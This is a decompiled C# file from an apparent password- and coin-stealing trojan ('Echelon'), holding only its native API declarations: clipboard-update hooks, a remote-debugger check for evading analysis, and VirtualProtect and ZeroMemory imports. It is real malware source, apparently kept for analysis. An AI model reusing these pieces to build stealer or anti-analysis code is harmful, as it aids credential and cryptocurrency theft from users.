// Decompiled with JetBrains decompiler
// Type: Echelon.NativeMethods
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System;
using System.Runtime.InteropServices;

namespace Echelon
{
  internal class NativeMethods
  {
    public const int WM_CLIPBOARDUPDATE = 797;
    public static IntPtr HWND_MESSAGE = new IntPtr(-3);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, BestFitMapping = false)]
    internal static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("Kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static extern bool CheckRemoteDebuggerPresent(
      IntPtr hProcess,
      [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);

    [DllImport("user32")]
    public static extern int PostMessage(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam);

    [DllImport("user32", CharSet = CharSet.Unicode)]
    public static extern IntPtr FindWindow(string className, string caption);

    [DllImport("user32", CharSet = CharSet.Unicode)]
    public static extern IntPtr FindWindowEx(
      IntPtr parent,
      IntPtr startChild,
      string className,
      string caption);

    [DllImport("kernel32.dll")]
    internal static extern IntPtr ZeroMemory(IntPtr addr, IntPtr size);

    [DllImport("kernel32.dll")]
    internal static extern unsafe bool VirtualProtect(
      byte* lpAddress,
      int dwSize,
      uint flNewProtect,
      out uint lpflOldProtect);
  }
}
